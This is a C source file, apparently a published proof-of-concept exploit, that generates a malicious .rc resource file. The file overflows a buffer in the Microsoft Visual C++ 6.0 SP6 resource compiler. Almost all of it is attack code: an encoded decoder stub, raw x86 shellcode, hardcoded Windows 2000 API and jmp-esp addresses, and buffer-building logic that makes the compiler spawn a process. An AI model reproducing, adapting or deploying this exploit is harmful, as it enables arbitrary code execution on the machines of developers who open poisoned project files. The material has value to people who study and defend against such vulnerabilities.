//*****************
//
//  Microsoft Visual C++ 6.0 SP6 resource compiler buffer overflow 
//  vulnerability .rc resource files exploit 
//
//  vulnerability found / exploit built by porkythepig
//
//*****************

#include "stdio.h"
#include "stdlib.h"
#include "memory.h"

#define STR01 "Microsoft Visual Studio 6.0 SP6 .rc PoC exploit by porkythepig"
#define DEF_SPAWNED_PROCESS "notepad.exe"
#define EXPL_SIZE 283
#define DEC_CODE 0xBC
#define DEC_CODE_OFFSET 0x2D
#define ENC_SIZE_OFFSET 0x3E
#define SHIFT 0x40
#define SHIFT_DEC_OFFSET 0x35
#define PROC_NAME_OFFSET 0x107
#define GETSTAR_OFFSET 0x11
#define CREPRO_OFFSET 0x6d
#define GETWINDIR_OFFSET 0x25
#define ESPSUB_OFFSET 0x08
#define FNAMSHIFT_OFFSET 0x02

typedef struct
{
	unsigned int getStarInf;
	unsigned int crePro;
	unsigned int getWinDir;
	unsigned int jmpEspPtr;
}ApiPtrs;

ApiPtrs osApiPtrs[2]=
{
	0x7c4f49df,0x7c4fc0a0,0x7c4e9c00,0x782f28f7,
	0x7c596b7a,0x7c595010,0x7c592d23,0x77e16280
};

unsigned char decoder[]=
{
	0xeb,0x2a,0xeb,0x2a,0x8b,0xdc,0x81,0xc3,
	0x40,0xff,0xff,0xff,0x8b,0xcb,0x33,0xd2,
	0x8a,0x21,0x80,0xfc,0xbc,0x75,0xe9,0x41,
	0x8a,0x21,0x80,0xec,0x40,0x88,0x23,0x43,
	0x41,0x42,0x33,0xc0,0xb0,0x99,0x3b,0xd0,
	0x7c,0xe6,0xeb,0xd6,0xeb,0xef
};

unsigned char shlCode[]=
{
	0x83,0xc4,0x0c,0x8b,0xc4,0x8b,0xe6,0x90,
	0x90,0x90,0x50,0x66,0x2d,0x10,0x20,0x50,
	0xb8,0x7a,0x6b,0x59,0x7c,0xff,0xd0,0x5b,
	0x53,0x33,0xc0,0xb0,0xff,0x50,0x66,0x81,
	0xeb,0x10,0x30,0x53,0xb8,0x23,0x2d,0x59,
	0x7c,0xff,0xd0,0x58,0x50,0x66,0x2d,0x10,
	0x30,0x32,0xdb,0x38,0x18,0x74,0x03,0x40,
	0xeb,0xf9,0x5b,0x53,0xb2,0xff,0xb1,0x5c,
	0x88,0x08,0x40,0x38,0x13,0x74,0x08,0x8a,
	0x0b,0x88,0x08,0x43,0x40,0xeb,0xf4,0xb2,
	0x00,0x88,0x10,0x58,0x50,0x66,0x2d,0x10,
	0x30,0x8b,0xd0,0x58,0x50,0x66,0x2d,0x10,
	0x20,0x50,0x33,0xc9,0x51,0x51,0x51,0x51,
	0x51,0x51,0x51,0x52,0xb8,0x10,0x50,0x59,
	0x7c,0xff,0xd0,0xeb,0xfe
};

unsigned char jmp1Seq[]=
{
	0xe9,0x2d,0xff,0xff,0xff
};

unsigned char jmp0Seq[]=
{
	0xe9,0x28,0xff,0xff,0xff
};

unsigned char espSub0=0x4e;
unsigned char espSub1=0x5c;
unsigned char fnamShift0=0x0e;
unsigned char fnamShift1=0x1c;
unsigned char retOffset1=0xe7;
unsigned char retOffset0=0xf5;
unsigned char jmp1Offset=0xeb;
unsigned char jmp0Offset=0xf0;
unsigned short back3=0xf5eb;
unsigned char back3Offs=0xf9;

unsigned char buf0[EXPL_SIZE];
char *outName;
int osId;
int defProc;
unsigned char espSub;
unsigned char fnamShift;
unsigned char *jmpSeq;
unsigned char retOffset;
unsigned char jmpOffset;



int Encode(unsigned char *destBuf, unsigned char *srcBuf, int srcSize)
{
	int cnt,c1;

	for(cnt=0,c1=0;cnt<srcSize;cnt++)
	{
		if((srcBuf[cnt]<0x20)||(srcBuf[cnt]==0x22)||(srcBuf[cnt]==0x2f))
		{
			destBuf[c1]=DEC_CODE;
			destBuf[c1+1]=srcBuf[cnt]+SHIFT;
			c1+=2;
		}
		else
		{
			destBuf[c1]=srcBuf[cnt];
			c1++;
		}
	}

	return c1;
}

void CompileBuffer()
{
	int ptr=0;
	int encSiz;

	memset(buf0,'1',EXPL_SIZE);
	ptr+=sprintf((char*)buf0,"1 TYPELIB MOVEABLE PURE \"");

	decoder[ESPSUB_OFFSET]=espSub;
	
	memcpy(buf0+ptr,decoder,sizeof(decoder));
	buf0[DEC_CODE_OFFSET]=DEC_CODE;
	buf0[SHIFT_DEC_OFFSET]=SHIFT;
	ptr+=sizeof(decoder);

	*((unsigned int*)(shlCode+GETSTAR_OFFSET))=osApiPtrs[osId].getStarInf;
	*((unsigned int*)(shlCode+CREPRO_OFFSET))=osApiPtrs[osId].crePro;
	*((unsigned int*)(shlCode+GETWINDIR_OFFSET))=osApiPtrs[osId].getWinDir;

	shlCode[FNAMSHIFT_OFFSET]=fnamShift;
	
	encSiz=Encode(buf0+ptr,shlCode,sizeof(shlCode));
	buf0[ENC_SIZE_OFFSET]=sizeof(shlCode);

	sprintf((char*)(buf0+PROC_NAME_OFFSET),"%s\xff",DEF_SPAWNED_PROCESS);
	buf0[PROC_NAME_OFFSET+sizeof(DEF_SPAWNED_PROCESS)]=0xff;

	*((unsigned int*)(buf0+retOffset))=osApiPtrs[osId].jmpEspPtr;
	memcpy(buf0+jmpOffset,jmpSeq,5);

	if(osId==0)
	{
		*((unsigned short*)(buf0+back3Offs))=back3;
	}

	sprintf((char*)(buf0+EXPL_SIZE-3),"\"\r\n");

	printf("Exploit buffer compiled\n");
}

void WriteBuffer()
{
	FILE *o;

	o=fopen(outName,"wb");
	if(o==NULL)
	{
		printf("Cannot open file for writing\n");
		exit(0);
	}

	fprintf(o,"//**********\r\n// %s\r\n//**********\r\n\r\n",STR01);
	fwrite(buf0,EXPL_SIZE,1,o);
	fclose(o);

	printf("Output .rc file [ %s ] built successfully\n",outName);
}

void ProcessInput(int argc, char* argv[])
{
	printf("\nMicrosoft Visual Studio 6  .rc resource files exploit\n");
	printf("Vulnerability found & exploit built by porkythepig\n");
	
	if(argc<3)
	{
		printf("Syntax: exploit.exe os outName\n");
		printf("[os]        host OS, possible choices:\n");
		printf("               0   Windows 2000 SP4 English\n"); 
		printf("               1   Windows 2000 SP4 English all updates on day 11.01.2007\n");
		printf("[outName]   output .rc exploit file name\n");
		exit(0);
	}

	osId=atol(argv[1]);
	if((osId<0)||(osId>1))
	{
		exit(0);
	}

	if(osId==0)
	{
		espSub=espSub0;
		fnamShift=fnamShift0;
		jmpSeq=jmp0Seq;
		jmpOffset=jmp0Offset;
		retOffset=retOffset0;
	}
	else
	{
		espSub=espSub1;
		fnamShift=fnamShift1;
		jmpSeq=jmp1Seq;
		jmpOffset=jmp1Offset;
		retOffset=retOffset1;
	}

	outName=argv[2];
}

int main(int argc, char* argv[])
{

	ProcessInput(argc,argv);
	CompileBuffer();
	WriteBuffer();

	return 0;
}